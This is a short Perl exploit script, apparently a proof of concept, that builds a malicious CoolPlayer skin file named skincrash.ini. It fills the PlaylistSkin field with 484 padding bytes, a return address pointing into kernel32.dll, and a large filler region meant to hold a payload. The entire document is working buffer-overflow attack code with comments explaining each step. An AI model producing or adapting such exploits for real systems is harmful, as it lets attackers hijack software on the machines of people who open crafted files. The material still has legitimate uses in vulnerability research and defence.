$file1 = "skincrash.ini"; 				#the name of the file that will be created, must be .ini
$buffer = "[CoolPlayer Skin]\nPlaylistSkin="; 	#include this as a header before overflowing with A's for it to be recognised as a skin file	
$buffer .= "A" x 484;				#number of chars before EIP
$buffer .= pack('V',0x7C86467B); 		#include the jump location from kernel32.dll	
$buffer .= "C" x 100000;				#append (.=) 100000 C's to find the max size
open($FILE,">$file1");				#open or create a file with the name defined in $file1
print $FILE $buffer;				#print the contents of $buffer and everything appended
close($FILE);	


